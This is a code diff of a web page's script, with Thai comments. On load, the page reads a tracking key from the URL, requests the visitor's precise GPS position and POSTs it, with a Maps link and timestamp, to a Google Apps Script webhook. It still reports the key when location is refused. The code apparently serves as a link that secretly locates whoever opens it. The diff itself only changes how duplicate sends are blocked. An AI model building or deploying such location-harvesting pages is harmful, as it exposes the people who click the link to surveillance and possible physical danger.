@@ -213,39 +213,15 @@
   
   <script src="script.js"></script>
   <script>
-    // ป้องกันการทำงานซ้ำซ้อนในการส่งข้อมูล
-    var hasInitialized = false; 
-    
     // ส่วนนี้ควรอยู่ในฟังก์ชันที่ทำงานเมื่อโหลดหน้าเว็บ
+    // เพิ่มตัวแปรเพื่อป้องกันการทำงานซ้ำ
+    let isDataSent = false;
+    
     function initialize() {
-      // ตรวจสอบว่าได้ทำงานไปแล้วหรือไม่
-      if (hasInitialized) {
-        console.log("ฟังก์ชัน initialize ถูกเรียกซ้ำ - ข้าม");
-        return;
-      }
-      
-      // ทำเครื่องหมายว่าได้ทำงานแล้ว
-      hasInitialized = true;
-      
       // อ่านค่าพารามิเตอร์จาก URL
       const urlParams = new URLSearchParams(window.location.search);
       const trackingKey = urlParams.get('daily');
       const source = urlParams.get('source') || 'link'; // หากไม่ระบุ ถือว่าเป็นการคลิกจากลิงก์
-      
-      // ตรวจสอบ trackingKey ซ้ำอีกครั้งเพื่อความมั่นใจ
-      if (!trackingKey || trackingKey === "ไม่มีค่า") {
-        console.log("ไม่พบ tracking key ที่ถูกต้อง - ยกเลิกการทำงาน");
-        return;
-      }
-      
-      // สร้าง requestId ที่ไม่ซ้ำกันสำหรับการร้องขอนี้
-      const requestId = 'req_' + Date.now().toString(36) + Math.random().toString(36).substr(2, 5);
-      
-      // ตรวจสอบว่าเคยส่งข้อมูลนี้แล้วหรือไม่
-      if (sessionStorage.getItem('sent_' + trackingKey)) {
-        console.log("ข้อมูลนี้เคยส่งแล้ว - ยกเลิก");
-        return;
-      }
       
       // ส่วนที่ดึงตำแหน่ง GPS (ต้องทำงานไม่ว่าจะมาจาก source ใดก็ตาม)
       if (navigator.geolocation) {
@@ -259,37 +235,37 @@
               gmapLink: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`
             };
             
-            // ส่งข้อมูลไป webhook พร้อมระบุ source
-            sendDataToWebhook(trackingKey, location, source, requestId);
+            // ส่งข้อมูลไป webhook พร้อมระบุ source และป้องกันการส่งซ้ำ
+            if (!isDataSent) {
+              sendDataToWebhook(trackingKey, location, source);
+              isDataSent = true;
+            }
           },
           (error) => {
             console.error("Error getting location:", error);
-            // ส่งข้อมูลไป webhook แม้จะไม่ได้ตำแหน่ง GPS
-            sendDataToWebhook(trackingKey, null, source, requestId);
-          },
-          {
-            enableHighAccuracy: true,
-            timeout: 10000,
-            maximumAge: 0
+            // ส่งข้อมูลไป webhook แม้จะไม่ได้ตำแหน่ง GPS และป้องกันการส่งซ้ำ
+            if (!isDataSent) {
+              sendDataToWebhook(trackingKey, null, source);
+              isDataSent = true;
+            }
           }
         );
       } else {
         console.log("Geolocation is not supported by this browser");
-        // ส่งข้อมูลไป webhook แม้จะไม่รองรับ GPS
-        sendDataToWebhook(trackingKey, null, source, requestId);
+        // ส่งข้อมูลไป webhook แม้จะไม่รองรับ GPS และป้องกันการส่งซ้ำ
+        if (!isDataSent) {
+          sendDataToWebhook(trackingKey, null, source);
+          isDataSent = true;
+        }
       }
     }
     
     // ฟังก์ชั่นสำหรับส่งข้อมูลไปยัง webhook
-    function sendDataToWebhook(trackingKey, location, source, requestId) {
-      // บันทึกว่าได้ส่งข้อมูลนี้แล้ว เพื่อป้องกันการส่งซ้ำ
-      try {
-        sessionStorage.setItem('sent_' + trackingKey, 'true');
-      } catch (e) {
-        console.warn("ไม่สามารถใช้งาน sessionStorage ได้:", e);
-      }
-      
+    function sendDataToWebhook(trackingKey, location, source) {
       // อ่านข้อมูลอื่นๆ ที่ต้องการส่ง
+      
+      // สร้าง unique ID สำหรับการร้องขอนี้
+      const requestId = "req_" + Date.now() + "_" + Math.random().toString(36).substring(2, 10);
       
       // สร้างออบเจ็กต์ข้อมูล
       const data = {
@@ -298,11 +274,14 @@
         location: location, // ข้อมูลตำแหน่ง GPS
         // ข้อมูลอื่นๆ
         timestamp: new Date().toLocaleString('th-TH', { timeZone: 'Asia/Bangkok' }),
-        requestId: requestId // เพิ่ม requestId เพื่อป้องกันการประมวลผลซ้ำ
+        // เพิ่ม requestId เพื่อป้องกันการทำงานซ้ำ
+        requestId: requestId,
       };
       
+      console.log("Sending data to webhook with requestId:", requestId);
+      
       // ส่งข้อมูลไปยัง webhook
-      fetch('https://script.google.com/macros/s/AKfycby-HfIS5wo_nmi0ZlHPKyw8MwUW1oqxbfI7CE34DoxUz5BYoV-rFCzJRCbi-81DB3ZI/exec', {
+      fetch('https://script.google.com/macros/s/AKfycbwivF66xrYnDZ6kN3syz0hkkxRPqwwozk1W8NPbqrlqGCOGEFmIKQ3y5f-hY-zXGGs/exec', {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
@@ -311,14 +290,8 @@
       }).catch(error => console.error('Error sending data to webhook:', error));
     }
     
-    // เรียกใช้ initialize เมื่อโหลดหน้าเว็บ - ตรวจสอบว่าไม่ได้ลงทะเบียน event listener ซ้ำ
-    if (document.readyState === 'loading') {
-      // ถ้า DOM ยังโหลดไม่เสร็จ รอให้ DOMContentLoaded
-      document.addEventListener('DOMContentLoaded', initialize, { once: true });
-    } else {
-      // ถ้า DOM โหลดเสร็จแล้ว เรียกใช้ initialize ทันที
-      initialize();
-    }
+    // เรียกใช้ initialize เมื่อโหลดหน้าเว็บ
+    document.addEventListener('DOMContentLoaded', initialize);
   </script>
 </body>
 </html>
